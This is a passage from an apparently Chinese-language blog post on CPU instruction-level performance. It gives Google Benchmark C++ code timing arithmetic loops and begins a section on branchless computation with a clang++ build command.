class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"benchmark/benchmark.h"</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BM_add</span><span class="hljs-params">(benchmark::State&amp; state)</span> </span>&#123;<br>    srand(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = state.range(<span class="hljs-number">0</span>);<br>    std::vector&lt;unsigned long&gt; v1(N), v2(N);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>        v1[i] = rand();<br>        v2[i] = rand();<br>    &#125;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p1 = v1.data();<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p2 = v2.data();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> _ : state) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a1 = <span class="hljs-number">0</span>, a2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>            a1 += p1[i] + p2[i];<br>        &#125;<br>        <span class="hljs-comment">// 不让编译器对 state 次相同的操作，进行优化</span><br>        <span class="hljs-comment">// 但是内层循环的运算操作的优化，仍然生效</span><br>        benchmark::DoNotOptimize(a1);<br>        benchmark::DoNotOptimize(a2);<br>        <span class="hljs-comment">// 强制写出结果到内存，高效的 内存屏障</span><br>        benchmark::ClobberMemory();<br>    &#125;<br>    state.SetItemsProcessed(N*state.iterations());<br>    <span class="hljs-comment">//state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BM_multiply</span><span class="hljs-params">(benchmark::State&amp; state)</span> </span>&#123;<br>    srand(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = state.range(<span class="hljs-number">0</span>);<br>    std::vector&lt;unsigned long&gt; v1(N), v2(N);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>        v1[i] = rand();<br>        v2[i] = rand();<br>    &#125;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p1 = v1.data();<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p2 = v2.data();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> _ : state) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a1 = <span class="hljs-number">0</span>, a2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>            a2 += p1[i] * p2[i];<br>        &#125;<br>        benchmark::DoNotOptimize(a1);<br>        benchmark::DoNotOptimize(a2);<br>        benchmark::ClobberMemory();<br>    &#125;<br>    state.SetItemsProcessed(N*state.iterations());<br>    <span class="hljs-comment">//state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BM_divide</span><span class="hljs-params">(benchmark::State&amp; state)</span> </span>&#123;<br>    srand(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = state.range(<span class="hljs-number">0</span>);<br>    std::vector&lt;unsigned long&gt; v1(N), v2(N);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>        v1[i] = rand();<br>        v2[i] = rand() + <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p1 = v1.data();<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p2 = v2.data();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> _ : state) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a1 = <span class="hljs-number">0</span>, a2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>            a2 += p1[i] / p2[i];<br>        &#125;<br>        benchmark::DoNotOptimize(a1);<br>        benchmark::DoNotOptimize(a2);<br>        benchmark::ClobberMemory();<br>    &#125;<br>    state.SetItemsProcessed(N*state.iterations());<br>    <span class="hljs-comment">//state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BM_add_multiply</span><span class="hljs-params">(benchmark::State&amp; state)</span> </span>&#123;<br>    srand(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = state.range(<span class="hljs-number">0</span>);<br>    std::vector&lt;unsigned long&gt; v1(N), v2(N);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>        v1[i] = rand();<br>        v2[i] = rand();<br>    &#125;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p1 = v1.data();<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p2 = v2.data();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> _ : state) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a1 = <span class="hljs-number">0</span>, a2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>            a1 += p1[i] + p2[i];<br>            a2 += p1[i] * p2[i];<br>        &#125;<br>        benchmark::DoNotOptimize(a1);<br>        benchmark::DoNotOptimize(a2);<br>        benchmark::ClobberMemory();<br>    &#125;<br>    state.SetItemsProcessed(N*state.iterations());<br>    <span class="hljs-comment">//state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BM_add_multiply2</span><span class="hljs-params">(benchmark::State&amp; state)</span> </span>&#123;<br>    srand(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = state.range(<span class="hljs-number">0</span>);<br>    std::vector&lt;unsigned long&gt; v1(N), v2(N);<br>    std::vector&lt;unsigned long&gt; v3(N), v4(N);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>        v1[i] = rand();<br>        v2[i] = rand();<br>        v3[i] = rand();<br>        v4[i] = rand();<br>    &#125;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p1 = v1.data();<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p2 = v2.data();<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p3 = v3.data();<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p4 = v4.data();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> _ : state) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a1 = <span class="hljs-number">0</span>, a2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>            a1 += p1[i] + p2[i];<br>            a2 += p3[i] * p4[i];<br>        &#125;<br>        benchmark::DoNotOptimize(a1);<br>        benchmark::DoNotOptimize(a2);<br>        benchmark::ClobberMemory();<br>    &#125;<br>    state.SetItemsProcessed(N*state.iterations());<br>    <span class="hljs-comment">//state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BM_add2_multiply_sub_shift</span><span class="hljs-params">(benchmark::State&amp; state)</span> </span>&#123;<br>    srand(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = state.range(<span class="hljs-number">0</span>);<br>    std::vector&lt;unsigned long&gt; v1(N), v2(N);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>        v1[i] = rand();<br>        v2[i] = rand();<br>    &#125;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p1 = v1.data();<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p2 = v2.data();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> _ : state) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a1 = <span class="hljs-number">0</span>, a2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a3 = <span class="hljs-number">0</span>, a4 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>            a1 += p1[i] + p2[i];<br>            a2 += p1[i] * p2[i];<br>            a3 += p1[i] &lt;&lt; <span class="hljs-number">2</span>;<br>            a4 += p2[i] - p1[i];<br>        &#125;<br>        benchmark::DoNotOptimize(a1);<br>        benchmark::DoNotOptimize(a2);<br>        benchmark::DoNotOptimize(a3);<br>        benchmark::DoNotOptimize(a4);<br>        benchmark::ClobberMemory();<br>    &#125;<br>    state.SetItemsProcessed(N*state.iterations());<br>    <span class="hljs-comment">//state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BM_instructions1</span><span class="hljs-params">(benchmark::State&amp; state)</span> </span>&#123;<br>    srand(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = state.range(<span class="hljs-number">0</span>);<br>    std::vector&lt;unsigned long&gt; v1(N), v2(N);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>        v1[i] = rand();<br>        v2[i] = rand();<br>    &#125;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p1 = v1.data();<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p2 = v2.data();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> _ : state) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a1 = <span class="hljs-number">0</span>, a2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a3 = <span class="hljs-number">0</span>, a4 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a5 = <span class="hljs-number">0</span>, a6 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>            a1 += p1[i] + p2[i];<br>            a2 += p1[i] * p2[i];<br>            a3 += p1[i] &lt;&lt; <span class="hljs-number">2</span>;<br>            a4 += p2[i] - p1[i];<br>            a5 += p2[i] &lt;&lt; <span class="hljs-number">1</span>;<br>            a6 += (p2[i] - <span class="hljs-number">3</span>);<br>        &#125;<br>        benchmark::DoNotOptimize(a1);<br>        benchmark::DoNotOptimize(a2);<br>        benchmark::DoNotOptimize(a3);<br>        benchmark::DoNotOptimize(a4);<br>        benchmark::DoNotOptimize(a5);<br>        benchmark::DoNotOptimize(a6);<br>        benchmark::ClobberMemory();<br>    &#125;<br>    state.SetItemsProcessed(N*state.iterations());<br>    <span class="hljs-comment">//state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BM_instructions2</span><span class="hljs-params">(benchmark::State&amp; state)</span> </span>&#123;<br>    srand(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = state.range(<span class="hljs-number">0</span>);<br>    std::vector&lt;unsigned long&gt; v1(N), v2(N);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>        v1[i] = rand();<br>        v2[i] = rand();<br>    &#125;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p1 = v1.data();<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p2 = v2.data();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> _ : state) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a1 = <span class="hljs-number">0</span>, a2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a3 = <span class="hljs-number">0</span>, a4 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a5 = <span class="hljs-number">0</span>, a6 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>            a1 += p1[i] + p2[i];<br>            a2 += p1[i] * p2[i];<br>            a3 += p1[i] &lt;&lt; <span class="hljs-number">2</span>;<br>            a4 += p2[i] - p1[i];<br>            a5 += (p2[i] &lt;&lt; <span class="hljs-number">1</span>)*p2[i];<br>            a6 += (p2[i] - <span class="hljs-number">3</span>)*p1[i];<br>        &#125;<br>        benchmark::DoNotOptimize(a1);<br>        benchmark::DoNotOptimize(a2);<br>        benchmark::DoNotOptimize(a3);<br>        benchmark::DoNotOptimize(a4);<br>        benchmark::DoNotOptimize(a5);<br>        benchmark::DoNotOptimize(a6);<br>        benchmark::ClobberMemory();<br>    &#125;<br>    state.SetItemsProcessed(N*state.iterations());<br>    <span class="hljs-comment">//state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BM_add2_multiply_sub_shift4</span><span class="hljs-params">(benchmark::State&amp; state)</span> </span>&#123;<br>    srand(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = state.range(<span class="hljs-number">0</span>);<br>    std::vector&lt;unsigned long&gt; v1(N), v2(N);<br>    std::vector&lt;unsigned long&gt; v3(N), v4(N);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>        v1[i] = rand();<br>        v2[i] = rand();<br>        v3[i] = rand();<br>        v4[i] = rand();<br>    &#125;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p1 = v1.data();<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p2 = v2.data();<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p3 = v3.data();<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p4 = v4.data();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> _ : state) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a1 = <span class="hljs-number">0</span>, a2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a3 = <span class="hljs-number">0</span>, a4 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>            a1 += p1[i] + p2[i];<br>            a2 += p2[i] * p3[i];<br>            a3 += p4[i] &lt;&lt; <span class="hljs-number">2</span>;<br>            a4 += p3[i] - p4[i];<br>        &#125;<br>        benchmark::DoNotOptimize(a1);<br>        benchmark::DoNotOptimize(a2);<br>        benchmark::DoNotOptimize(a3);<br>        benchmark::DoNotOptimize(a4);<br>        benchmark::ClobberMemory();<br>    &#125;<br>    state.SetItemsProcessed(N*state.iterations());<br>    <span class="hljs-comment">//state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BM_max</span><span class="hljs-params">(benchmark::State&amp; state)</span> </span>&#123;<br>    srand(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = state.range(<span class="hljs-number">0</span>);<br>    std::vector&lt;unsigned long&gt; v1(N), v2(N);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>        v1[i] = rand();<br>        v2[i] = rand();<br>    &#125;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p1 = v1.data();<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p2 = v2.data();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> _ : state) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a1 = <span class="hljs-number">0</span>, a2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>            a2 += (p1[i] &gt; p2[i]) ? p1[i] : p2[i];<br>        &#125;<br>        benchmark::DoNotOptimize(a1);<br>        benchmark::DoNotOptimize(a2);<br>        benchmark::ClobberMemory();<br>    &#125;<br>    state.SetItemsProcessed(N*state.iterations());<br>    <span class="hljs-comment">//state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">BM_add_multiply_dep</span><span class="hljs-params">(benchmark::State&amp; state)</span> </span>&#123;<br>    srand(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> N = state.range(<span class="hljs-number">0</span>);<br>    std::vector&lt;unsigned long&gt; v1(N), v2(N);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>        v1[i] = rand();<br>        v2[i] = rand();<br>    &#125;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p1 = v1.data();<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>* p2 = v2.data();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> _ : state) &#123;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> a1 = <span class="hljs-number">0</span>, a2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; N; ++i) &#123;<br>            a1 += (p1[i] + p2[i]) * (p1[i] - p2[i]);<br>            <span class="hljs-comment">//a1 += (p1[i] * p2[i]);</span><br>        &#125;<br>        benchmark::DoNotOptimize(a1);<br>        benchmark::DoNotOptimize(a2);<br>        benchmark::ClobberMemory();<br>    &#125;<br>    state.SetItemsProcessed(N*state.iterations());<br>    <span class="hljs-comment">//state.SetBytesProcessed(N*sizeof(unsigned long)*state.iterations());</span><br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ARGS \</span><br>    -&gt;Arg(<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">22</span>)<br><br>BENCHMARK(BM_add) ARGS;<br>BENCHMARK(BM_multiply) ARGS;<br>BENCHMARK(BM_divide) ARGS;<br>BENCHMARK(BM_add_multiply) ARGS;<br>BENCHMARK(BM_add_multiply2) ARGS;<br>BENCHMARK(BM_add2_multiply_sub_shift) ARGS;<br>BENCHMARK(BM_instructions1) ARGS;<br>BENCHMARK(BM_instructions2) ARGS;<br>BENCHMARK(BM_add2_multiply_sub_shift4) ARGS;<br>BENCHMARK(BM_max) ARGS;<br>BENCHMARK(BM_add_multiply_dep) ARGS;<br><br>BENCHMARK_MAIN();<br></code></pre></div></td></tr></table></figure><h3><span id="无分支计算">无分支计算</span></h3><p>无分支计算可以消除或者减轻分支预测失败带来的性能损失。</p><p>但是，如果消除分支的代价是，增加了非内联的复杂函数的调用次数，那么函数调用的代价会比分支预测失败的代价大。</p><p>因为函数调用本身就会中断流水线，这也是内联函数高效地一个原因之一。</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sh">// 编译命令<br>clang++ -g -O3 -mavx2 -Wall -pedantic -I<span class="hljs-variable">$GBEN_INC</span> -lpthread -lrt -lm 02_branch.C <span class="hljs-variable">$GBEN_LIB</span>/libbenchmark.a -o benchmar<br>k<br></code></pre></div></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MCA_START __asm volatile(<span class="hljs-meta-string">"# LLVM-MCA-BEGIN"</span>);</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MCA_END __asm volatile(<span class="hljs-meta-string">"# LLVM-MCA-END"</span>);</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"benchmark/benchmark.h"</span></span><br></code></pre></div></td></tr></table></figure><h4><span id="例一">例一</span></h4><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 